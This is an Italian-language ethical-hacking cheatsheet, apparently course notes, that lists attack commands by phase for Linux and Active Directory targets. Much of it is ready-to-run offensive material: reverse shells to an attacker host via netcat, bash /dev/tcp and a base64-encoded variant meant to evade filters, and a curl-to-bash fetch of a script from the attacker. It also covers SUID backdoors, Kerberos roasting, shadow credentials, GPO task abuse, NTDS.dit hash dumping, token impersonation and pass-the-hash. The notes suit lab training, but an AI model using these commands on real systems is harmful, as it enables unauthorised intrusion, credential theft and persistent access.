# Ethical Hacking Cheatsheet

Benvenuti nella "Bibbia" dell'Ethical Hacking. Questo cheatsheet raccoglie ogni scenario, comando e tecnica analizzata durante il corso, organizzata per fasi e macro-aree (Linux e Windows/AD).

## Fasi del Penetration Testing

| Fase | Descrizione |
| --- | --- |
| **Reconnaissance** | Mappatura della superficie d'attacco e raccolta informazioni. |
| **Weaponization** | Costruzione del payload malevolo. |
| **Delivery** | Consegna del payload al destinatario o sistema target. |
| **Exploitation** | Sfruttamento della vulnerabilità (shell, esecuzione codice, ecc.). |
| **Privilege Escalation** | Elevazione dei privilegi per raggiungere il livello massimo (Root/System). |
| **Persistency** | Installazione di backdoor per mantenere l'accesso nel tempo. |
| **Action on Objectives** | Movimento laterale o esecuzione degli obiettivi finali. |

---

## Indice dei Contenuti
- [Ricognizione (Reconnaissance)](#ricognizione-reconnaissance)
    - [Ricognizione Passiva](#ricognizione-passiva)
    - [Mapping e Enumerazione Attiva](#mapping-e-enumerazione-attiva)
- [Linux Operations](#linux-operations)
    - [Initial Access & Reverse Shells](#initial-access--reverse-shells)
    - [Shell Stabilization](#shell-stabilization)
    - [Linux Privilege Escalation](#linux-privilege-escalation)
- [Windows & Active Directory](#windows--active-directory)
    - [Active Directory Basics](#active-directory-basics)
    - [Information Gathering & AD Tools](#information-gathering--ad-tools)
    - [AD Attack Paths (Kerberoast, GMSA, GPO)](#ad-attack-paths)
    - [Windows Privilege Escalation](#windows-privilege-escalation)
- [Utility & Siti Utili](#utility--siti-utili)

---

# Ricognizione (Reconnaissance)

## Ricognizione Passiva

> Cosa cercare?
> Indirizzi email, sotto-domini, `sitemap.xml`, file dimenticati.

### Analisi Sorgente e URL
```bash
curl -s <URL>
```
*Esempio:* `curl -s http://wingdata.htb/`

### Filtraggio con Regex
```bash
grep -oP <REGEX> <FILE>
```
*Esempio:* `grep -oP '[\w\.-]+@[\w\.-]+\.\w+' index.html` (per email)

### Concatenazione e Formattazione
```bash
grep -oP <REGEX> <FILE> | cut -d '"' -f 2
```

### Verifica Certificati (Subdomains)
Consultare [Cert.sh](https://crt.sh/) per trovare sotto-domini.
```bash
curl -s "https://crt.sh/?q=<TARGET_DOMAIN>&output=json" > subdomains_crt.txt
```

### HTTPS Header Fingerprint
Verifica versioni webserver e header.
```bash
for domain in $(cat <SUBDOMAINS_FILE>); do 
	curl -sI -m 5 echo %domain 2>/dev/null
; done > header_subdomain.txt
```

### Risalire agli IP
```bash
host <HOSTNAME>
ping <HOSTNAME>
whois <HOSTNAME>
```

---

## Mapping e Enumerazione Attiva

### Host Discovery (Ping Sweep)
```bash
nmap -sn <NETWORK>/<MASK>
nmap -PR <NETWORK>/<MASK> # ARP discovery
```
*Esempio:* `nmap -sn 172.20.0.0/24`

### Scansione Porte e Versioni
```bash
nmap -sV -sC <TARGET_IP> -oA <OUTPUT_FILE>
nmap -p- <TARGET_IP> -oA <OUTPUT_FULL_SCAN> # Full range scan
```

### Enumerazione Web (Directory/Vhost)
```bash
gobuster dir -u <URL> -w <WORDLIST>
gobuster vhost -u <URL> -w <WORDLIST> --append-domain
```
*Esempio:* `gobuster dir -u http://wingdata.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

### Cartelle .git e FTP
Accesso a file sensibili:
```
<URL>/.git/logs/HEAD
ftp <TARGET_IP>
```

---

# Linux Operations

## Initial Access & Reverse Shells

### Reverse Shell Payloads
Vedi [RevShells.com](https://www.revshells.com/) per generatori.

**Netcat:**
```bash
nc -nv <ATTACKER_IP> <PORT> -e /bin/bash
```

**Bash Socket:**
```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

**Base64 Payload (per bypass):**
```bash
echo -n "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1" | base64 -w0
# Esecuzione
echo -n <B64_STRING> | base64 -d | bash
```

### Shell Stabilization
Rendere la shell interattiva e stabile.
1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. `Ctrl + Z` (background)
3. `stty raw -echo; fg`
4. `invio + invio`
5. `export TERM=xterm`

### SQL Injection (Automated)
```bash
sqlmap -r <REQUEST_FILE>.req
```

---

## Linux Privilege Escalation

### Information Gathering locale
```bash
sudo -l # Lista comandi eseguibili come root
whoami /priv
find /bin -perm -u=s 2>/dev/null # Ricerca file SUID
cat /etc/passwd | grep sh # Utenti con shell
```

### LinPEAS
Tool automatico per PrivEsc: [LinPEAS GitHub](https://github.com/peass-ng/PEASS-ng).
```bash
curl <ATTACKER_IP>:<PORT>/linpeas.sh | bash
```

### SUID Bash Trick
Se è possibile copiare o modificare permessi come root:
```bash
cp /bin/bash /tmp/bash
chown root:root /tmp/bash
chmod u+s /tmp/bash
# Esecuzione
/tmp/bash -p
```

### Esempi Scenari Specifici
- **Tar TOCTOU:** Sfruttamento vulnerabilità `tar` con wildcard in script sudo.
- **Python eval():** Iniezione di codice in funzioni `eval()` o stringhe `f"{payload}"`.
- **Mirth Connect RCE:** Sfruttamento `CVE 2023-43208` tramite payload XML.

---

# Windows & Active Directory

## Active Directory Basics

### Porte Fondamentali
| Porta | Servizio |
| --- | --- |
| **53** | DNS (Indica spesso il DC) |
| **88** | Kerberos |
| **389/636** | LDAP / LDAPS |
| **445** | SMB (Samba) |
| **3389** | RDP |
| **5985/5986** | WinRM (HTTP/HTTPS) |

---

## Information Gathering & AD Tools

### NetExec (nxc) - Il coltellino svizzero
```bash
nxc smb <TARGET_IP> -u '' -p '' --shares # Null Session
nxc smb <TARGET_IP> -u 'anonymus' -p '' --shares # Anonymous
nxc smb <TARGET_IP> -u <USER> -p <PW> --shares # Valid Creds
nxc ldap <TARGET_IP> -u <USER> -p <PW> --users # Enumerazione utenti
```

### LDAP Search
```bash
ldapsearch -x -H ldap://<URL> -b 'DC=<DOMAIN>,DC=<LOCAL>' 'ObjectClass=Person'
```

### BloodHound / RustHound
Mappatura dei path d'attacco tramite grafi.
```bash
rusthound-ce -i <TARGET_IP> --domain <DOMAIN> -u <USER> -p <PW> -z
```
*Nota:* Caricare lo zip generato in BloodHound per analizzare le relazioni (`GenericAll`, `WriteOwner`, `MemberOf`).

---

## AD Attack Paths

### Kerberoasting
Richiesta di ticket TGS per account con SPN attivo.
```bash
GetNPUsers.py <DOMAIN>/ -userfile <USERS_FILE> -format hashcat -outputfile hashes.asreproast
```

### Shadow Credentials
Sfruttamento dell'attributo `msDS-KeyCredentialLink`.
```bash
certipy shadow -u <USER> -p <PW> -account <VICTIM_USER> -target <DC_FQDN> auto
```

### GMSA Exploitation
Recupero password per Group Managed Service Accounts.
```bash
python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PW> set object '<GMSA_ACCOUNT>$' msDS-GroupMSAMembership -v "O:SD:(A;;0x10;;;<USER_SID>)"
```

### GPO Abuse (SharpGPOAbuse)
Creazione di Task malevoli tramite permessi su GPO.
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author <DOMAIN>\Administrator --Command "cmd.exe" --Arguments "/c <PAYLOAD>" --GPOName "<GPO_NAME>" --force
```

---

## Windows Privilege Escalation

### SeBackupPrivilege (NTDS.dit Dump)
1. Creare script `diskshadow`:
```
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
```
2. Estrarre database AD:
```bash
robocopy /b z:\windows\ntds . ntds.dit
reg save hklm\system system
```
3. Dump degli hash:
```bash
secretsdump.py -ntds ntds.dit -system system local
```

### Token Impersonation (GodPotato)
Sfruttamento privilegi `SeImpersonatePrivilege`.
```bash
.\GodPotato-NET4.exe -cmd "cmd /c <COMMAND>"
```

### Pass-the-Hash (PtH)
```bash
evil-winrm -i <TARGET_IP> -u <USER> -H <NT_HASH>
psexec.py -hashes :<NT_HASH> <USER>@<TARGET_IP>
```

---

# Utility & Siti Utili

### Siti di Riferimento
- **Hacktricks:** [book.hacktricks.wiki](https://book.hacktricks.wiki/en/index.html) (Bibbia dell'hacking)
- **RevShells:** [revshells.com](https://www.revshells.com/) (Reverse Shell generator)
- **The Hacker Recipes:** [thehacker.recipes](https://www.thehacker.recipes/) (AD focus)
- **ExploitDB:** [exploit-db.com](https://www.exploit-db.com/) (PoC pubblici)
- **Mitre Attack:** [attack.mitre.org](https://attack.mitre.org/) (Tassonomia attacchi)

### Tool Indispensabili
- **Impacket:** Suite di script python per network protocols.
- **NetExec (nxc):** Esecuzione comandi e enumerazione multi-protocollo.
- **Certipy:** Tool per l'enumerazione e exploit di AD CS.
- **BloodHound:** Analisi dei privilegi in Active Directory.
- **Hashcat / John:** Cracking di password e hash.
- **Evil-WinRM:** Shell remota per Windows.

> Ricorda
> La chiave del successo nel Penetration Testing è la **pazienza** e il **mapping continuo**. Se un vettore fallisce, torna alla fase di enumerazione e cerca nuovi collegamenti in BloodHound.
